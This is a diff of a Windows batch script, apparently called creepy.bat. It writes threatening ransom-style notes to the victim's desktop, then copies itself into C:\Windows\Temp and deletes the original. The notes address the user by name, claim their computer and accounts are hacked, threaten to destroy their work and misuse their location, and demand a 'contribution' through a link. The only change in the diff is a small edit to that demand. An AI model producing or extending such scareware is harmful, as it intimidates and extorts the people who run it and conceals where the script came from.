@@ -25,7 +25,7 @@ echo We have access to everything you own,
 echo We are going to delete this file, and leave you a note (:
 echo say the last words to you, yes you %username%,
 echo because, %username% you are completely hacked and you will be kept in our so-called "victims lair"...
-echo You are our next target, %username%... because you will never get your computer and accounts back... and we will do something bad to both of those things so be ready for your work to all be gone... archer hackers are happy! (:... and also we will say something to you, %username%... you know you have been hacked by archer hackers right? well you need to contribute to our team or else we will use your location for fun... (: so do it quick! and heres the link: https://ahakersopl.com/contrib/victim > %userprofile%\desktop\note.txt 
+echo You are our next target, %username%... because you will never get your computer and accounts back... and we will do something bad to both of those things so be ready for your work to all be gone... archer hackers are happy! (:... and also we will say something to you, %username%... you know you have been hacked by archer hackers right? well you need to contribute to our team or else we will use your location for fun... (: so do it quick! and heres the link to contribute: https://ahakersopl.com/contrib/victim > %userprofile%\desktop\note.txt 
 echo We will never forget you and we will meet you soon, %username%... so always contribute to the archer hackers team fast, but here is a quick note: %username% will be a never forgotten victim of ours... > %userprofile%\desktop\remembertokeep.txt
 copy %userprofile%\desktop\creepy.bat C:\Windows\Temp
 del %userprofile%\desktop\creepy.bat
